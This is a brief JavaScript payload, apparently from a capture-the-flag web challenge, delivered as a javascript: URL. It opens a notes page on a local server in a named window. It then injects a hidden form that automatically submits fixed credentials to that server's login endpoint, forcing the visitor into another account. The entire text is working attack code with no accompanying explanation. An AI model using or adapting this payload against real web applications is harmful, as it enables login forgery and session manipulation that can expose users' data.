javascript: document.write(`
<script>
	window.open("http://0.0.0.0:8080/notes","lmao");
</script>
<form action=http://0.0.0.0:8080/login method=POST name=form>
<input name=username value=a>
<input name=password value=a>
</form>
<script>
setTimeout(() => document.forms[0].submit(), 500);
</script>
`);
